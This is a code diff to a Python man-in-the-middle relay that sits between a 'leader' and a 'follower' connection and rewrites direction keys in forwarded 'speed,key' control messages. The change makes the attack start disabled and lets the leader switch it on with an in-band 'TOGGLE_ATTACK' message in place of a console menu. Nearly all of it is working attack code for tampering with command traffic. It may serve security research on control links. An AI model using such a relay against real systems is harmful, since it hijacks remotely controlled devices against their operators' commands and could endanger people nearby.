@@ -4,7 +4,7 @@ import time
 
 # Global variables for attack toggle
 toggle_lock = threading.Lock()
-attack_enabled = True  # Starts enabled
+attack_enabled = False  # Starts disabled
 
 def manipulate_direction(key):
     """
@@ -39,11 +39,16 @@ def handle_leader_to_follower(leader_conn, follower_conn):
             original = data.decode('utf-8')
             print(f"Original data: {original}")
             
+            # Handle toggle command from leader
+            if original == "TOGGLE_ATTACK":
+                toggle_attack()
+                continue  # Skip forwarding this command
+            
             # Check attack state thread-safely
             with toggle_lock:
                 enabled = attack_enabled
             
-            if enabled:
+            if enabled and ',' in original:
                 try:
                     speed, key = original.split(',')
                     new_key = manipulate_direction(key)
@@ -62,34 +67,12 @@ def handle_leader_to_follower(leader_conn, follower_conn):
         leader_conn.close()
         follower_conn.close()
 
-
 def toggle_attack():
     global attack_enabled
     with toggle_lock:
         attack_enabled = not attack_enabled
         status = "ENABLED" if attack_enabled else "DISABLED"
         print(f"\n[!] Attack mode {status}")
-
-def handle_commands():
-    print("\n=== ATTACK CONTROL ===")
-    print("Type 'toggle' to enable/disable attack")
-    print("Type 'status' to show current mode")
-    print("Type 'exit' to terminate")
-    
-    while True:
-        cmd = input("Command> ").strip().lower()
-        if cmd == 'toggle':
-            toggle_attack()
-        elif cmd == 'status':
-            with toggle_lock:
-                st = "ENABLED" if attack_enabled else "DISABLED"
-            print(f"Attack is currently {st}")
-        elif cmd == 'exit':
-            print("Exiting control interface...")
-            break
-        else:
-            print("Unknown command. Use 'toggle', 'status', or 'exit'.")
-
 
 def start_relay():
     # Leader socket
@@ -111,23 +94,20 @@ def start_relay():
     print(f"Follower connected from {follower_addr}")
 
     print("\n=== RELAY ACTIVE ===")
-    print("Attack manipulation is initially ENABLED")
-
-    # Start the command interface in its own thread
-    threading.Thread(target=handle_commands, daemon=True).start()
+    print("Attack manipulation is initially DISABLED")
 
     # Start the relay/mitm thread
-    threading.Thread(
+    relay_thread = threading.Thread(
         target=handle_leader_to_follower,
         args=(leader_conn, follower_conn),
         daemon=True
-    ).start()
+    )
+    relay_thread.start()
 
     try:
-        while True:
-            time.sleep(1)
+        relay_thread.join()
     except KeyboardInterrupt:
-        print("\nShutting down relay and control interface...")
+        print("\nShutting down relay...")
     finally:
         leader_conn.close()
         follower_conn.close()
